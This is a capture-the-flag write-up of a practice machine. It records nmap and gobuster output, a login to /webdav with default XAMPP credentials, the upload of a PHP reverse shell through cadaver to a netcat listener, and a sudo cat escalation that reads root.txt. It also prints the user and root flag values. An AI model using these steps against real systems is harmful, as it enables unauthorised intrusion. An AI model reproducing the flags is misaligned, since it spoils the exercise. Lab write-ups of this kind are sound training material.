##### Have a trouble at reconnaissance phase and searching for help :((
## SSH Scan

```bash
sudo nmap -sVC -O -nP 10.10.132.50

Nmap scan report for 10.10.132.50
Host is up (0.29s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=11/16%OT=80%CT=1%CU=40883%PV=Y%DS=3%DC=I%G=Y%TM=673
OS:895CB%P=x86_64-pc-linux-gnu)SEQ(SP=FC%GCD=1%ISR=100%TI=Z%CI=I%II=I%TS=8)
OS:SEQ(SP=FC%GCD=2%ISR=100%TI=Z%CI=I%II=I%TS=8)OPS(O1=M509ST11NW7%O2=M509ST
OS:11NW7%O3=M509NNT11NW7%O4=M509ST11NW7%O5=M509ST11NW7%O6=M509ST11)WIN(W1=6
OS:8DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M
OS:509NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T
OS:4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+
OS:%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y
OS:%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%
OS:RID=G%RIPCK=G%RUCK=54CA%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
```

## Disconvery

```bash
gobuster dir -u http://10.10.132.50 -w ~/SecLists/Discovery/Web-Content/common.txt

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.132.50
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/m1nh/SecLists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 291]
/.htpasswd            (Status: 403) [Size: 296]
/.htaccess            (Status: 403) [Size: 296]
/index.html           (Status: 200) [Size: 11321]
/server-status        (Status: 403) [Size: 300]
/webdav               (Status: 401) [Size: 459]
Progress: 4734 / 4735 (99.98%)
===============================================================
Finished
===============================================================
```

Found a path `/webdav` required authentication.
## Research about `webdav`

WebDAV is **an Internet-based open standard that enables editing Web sites over HTTP and HTTPS connections**.

Access to the path `/webdav` it required username and password.
By searching about `webdav default credential` i found a [page](https://xforeveryman.blogspot.com/2012/01/helper-webdav-xampp-173-default.html), that tell me default credential and it work!
	username: wampp
	password: xampp
There is a file that contain a username and a hashed password. Since from the `Nmap` scan result, there is no `SSH` port opening, so i think cracking this password is not worth anymore.

From the [HackTrick](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/put-method-webdav) site, I saw the `cadevar` tool is used to upload file via `webdav`. 

## Create a reverse shell

Start a `netcat` listener:
```bash
nc -nlvp 4444
```

Using [RevShells](https://www.revshells.com/) page to create a PHP file with payload and using `cadevar` tool to upload the exploit code to the server.

## Get Flag

After `netcat` connect to the target shell.

Found `user.txt` flag in `/home/merlin` path:
	449b40fe93f78a938523b7e4dcd66d2a

Using `sudo -l` command, the output show that the current user can run `cat` binary as `root` user without enter password. 

Since `cat` binary not have option to execute with other command and the `root.txt` flag is normally place inside the `/root` path, so run the command to get `root.txt` flag:
```bash
sudo /usr/bin/cat /root/root.txt

#Output: 101101ddc16b0cdf65ba0b8a7af7afa5
```

## Note
The exploitation can be using `metasploit` with `exploit/windows/http/xampp_webdav_upload_php` module as same result.